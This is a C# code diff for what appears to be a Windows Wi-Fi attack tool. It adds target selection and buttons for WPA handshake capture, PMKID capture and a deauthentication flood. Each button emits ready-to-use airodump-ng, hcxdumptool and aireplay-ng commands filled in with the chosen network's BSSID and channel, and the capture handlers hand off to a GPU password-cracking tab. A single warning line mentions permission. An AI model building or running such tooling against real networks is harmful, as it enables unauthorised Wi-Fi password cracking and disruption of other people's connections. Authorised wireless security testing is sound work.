@@ -33,6 +33,7 @@ public sealed partial class WirelessPage : Page
 {
     private readonly ObservableCollection<WifiNetwork> _networks = new();
     private readonly ObservableCollection<string>       _profiles = new();
+    private WifiNetwork? _selectedNetwork;
 
     public WirelessPage()
     {
@@ -117,7 +118,27 @@ public sealed partial class WirelessPage : Page
     }
 
     // ── Nearby networks ───────────────────────────────────────────────────────
+    private async void OnScanNetworks(object sender, RoutedEventArgs e)
+    {
+        DispatcherQueue.TryEnqueue(() =>
+        {
+            ScanRing.Visibility = Visibility.Visible;
+            ScanRing.IsActive   = true;
+            NetworkCount.Text   = "Scanning…";
+            _networks.Clear();
+        });
+
+        await LoadNearbyNetworks();
+
+        DispatcherQueue.TryEnqueue(() =>
+        {
+            ScanRing.IsActive   = false;
+            ScanRing.Visibility = Visibility.Collapsed;
+        });
+    }
+
     private async Task LoadNearbyNetworks()
+
     {
         string raw = await RunNetshAsync("wlan show networks mode=bssid");
         if (string.IsNullOrWhiteSpace(raw)) return;
@@ -277,7 +298,147 @@ public sealed partial class WirelessPage : Page
         }
     }
 
+    // ── Network Target Selection & Attacks ─────────────────────────────────────
+
+    private void OnSelectNetworkClicked(object sender, RoutedEventArgs e)
+    {
+        if (sender is Button btn && btn.Tag is WifiNetwork network)
+            SelectNetwork(network);
+    }
+
+    private void SelectNetwork(WifiNetwork network)
+    {
+        _selectedNetwork = network;
+        DispatcherQueue.TryEnqueue(() =>
+        {
+            TargetSsid.Text  = network.Ssid;
+            TargetBssid.Text = network.Bssid.Length > 0 ? network.Bssid : "—";
+            TargetAuth.Text  = network.Auth.Length  > 0 ? network.Auth  : "—";
+            AttackOutputBox.Text = "";
+            AttackTargetPanel.Visibility = Visibility.Visible;
+            // Scroll the panel into view by scrolling the parent ScrollViewer
+            AttackTargetPanel.StartBringIntoView();
+        });
+    }
+
+    private void OnClearTarget(object sender, RoutedEventArgs e)
+    {
+        _selectedNetwork = null;
+        DispatcherQueue.TryEnqueue(() =>
+        {
+            AttackTargetPanel.Visibility = Visibility.Collapsed;
+            AttackOutputBox.Text = "";
+        });
+    }
+
+    private void AppendAttack(string line)
+    {
+        DispatcherQueue.TryEnqueue(() =>
+        {
+            AttackOutputBox.Text += line + "\n";
+            // Auto-scroll
+            AttackOutputBox.Select(AttackOutputBox.Text.Length, 0);
+        });
+    }
+
+    private async void OnWpaHandshake(object sender, RoutedEventArgs e)
+    {
+        if (_selectedNetwork == null) return;
+        AppendAttack($"[→] Target: {_selectedNetwork.Ssid}  ({_selectedNetwork.Bssid})");
+        AppendAttack("[→] WPA Handshake requires a monitor-mode capable adapter...");
+        await Task.Delay(200);
+
+        // Check for airodump-ng in WSL
+        bool hasAirodump = await Task.Run(() =>
+        {
+            try
+            {
+                var psi = new System.Diagnostics.ProcessStartInfo("wsl", "-e which airodump-ng")
+                { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
+                using var p = System.Diagnostics.Process.Start(psi)!;
+                string o = p.StandardOutput.ReadToEnd(); p.WaitForExit();
+                return o.Trim().Length > 0;
+            }
+            catch { return false; }
+        });
+
+        if (hasAirodump)
+        {
+            AppendAttack("[✓] airodump-ng found in WSL.");
+            AppendAttack($"[HINT] Run in WSL terminal:");
+            AppendAttack($"      sudo airodump-ng -c {_selectedNetwork.Channel} --bssid {_selectedNetwork.Bssid} -w capture wlan0mon");
+            AppendAttack("[HINT] Then use 'Convert .cap → .hc22000' on the WPA Cracker tab.");
+        }
+        else
+        {
+            AppendAttack("[WARN] airodump-ng not found in WSL.");
+            AppendAttack("[HINT] Install: sudo apt install aircrack-ng");
+            AppendAttack("[HINT] Enable monitor mode: sudo airmon-ng start wlan0");
+            AppendAttack($"[HINT] Capture: sudo airodump-ng -c {_selectedNetwork.Channel} --bssid {_selectedNetwork.Bssid} -w capture wlan0mon");
+            AppendAttack("[INFO] Requires a USB Wi-Fi adapter supporting monitor mode.");
+        }
+
+        AppendAttack("\n[→] After capturing, go to GPU Cracker tab to crack the password.");
+    }
+
+    private async void OnPmkidAttack(object sender, RoutedEventArgs e)
+    {
+        if (_selectedNetwork == null) return;
+        AppendAttack($"[→] PMKID attack on: {_selectedNetwork.Ssid}  ({_selectedNetwork.Bssid})");
+        AppendAttack("[INFO] PMKID does not require a connected client or deauth.");
+        await Task.Delay(200);
+
+        bool hasHcxdump = await Task.Run(() =>
+        {
+            try
+            {
+                var psi = new System.Diagnostics.ProcessStartInfo("wsl", "-e which hcxdumptool")
+                { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
+                using var p = System.Diagnostics.Process.Start(psi)!;
+                string o = p.StandardOutput.ReadToEnd(); p.WaitForExit();
+                return o.Trim().Length > 0;
+            }
+            catch { return false; }
+        });
+
+        if (hasHcxdump)
+        {
+            AppendAttack("[✓] hcxdumptool found.");
+            string bssidFilter = _selectedNetwork.Bssid.Replace(":", "");
+            AppendAttack("[HINT] Run in WSL terminal:");
+            AppendAttack($"      sudo hcxdumptool -i wlan0 --filtermode=2 --filterlist_ap={bssidFilter} -o pmkid.pcapng");
+            AppendAttack("      hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng");
+            AppendAttack("[→] Then load pmkid.hc22000 in the GPU Cracker tab.");
+        }
+        else
+        {
+            AppendAttack("[WARN] hcxdumptool not found in WSL.");
+            AppendAttack("[HINT] Install: sudo apt install hcxdumptool hcxtools");
+            AppendAttack("[HINT] Then re-try PMKID Capture.");
+        }
+    }
+
+    private void OnDeauthFlood(object sender, RoutedEventArgs e)
+    {
+        if (_selectedNetwork == null) return;
+        AppendAttack($"[→] Deauth Flood target: {_selectedNetwork.Ssid}  ({_selectedNetwork.Bssid})");
+        AppendAttack("[WARN] Deauthentication requires monitor mode + packet injection capability.");
+        AppendAttack("[WARN] Use ONLY on networks you own or have explicit permission to test.");
+        AppendAttack("[INFO] Most built-in Wi-Fi adapters cannot inject packets.");
+        AppendAttack("[HINT] Use a USB adapter supporting injection (e.g. Alfa AWUS036NH).");
+        AppendAttack("[HINT] Run in WSL: sudo airmon-ng start wlan0");
+        AppendAttack($"[HINT]           sudo aireplay-ng --deauth 50 -a {_selectedNetwork.Bssid} wlan0mon");
+        AppendAttack("[→] Deauth forces clients to reconnect → captures WPA handshake.");
+    }
+
+    private void OnGoToGpuCracker(object sender, RoutedEventArgs e)
+    {
+        if (App.Window is MainWindow mw)
+            mw.NavigateTo("HashcatPage");
+    }
+
     // ── Helpers ───────────────────────────────────────────────────────────────
+
     private static Task<string> RunNetshAsync(string args) => Task.Run(() =>
     {
         try
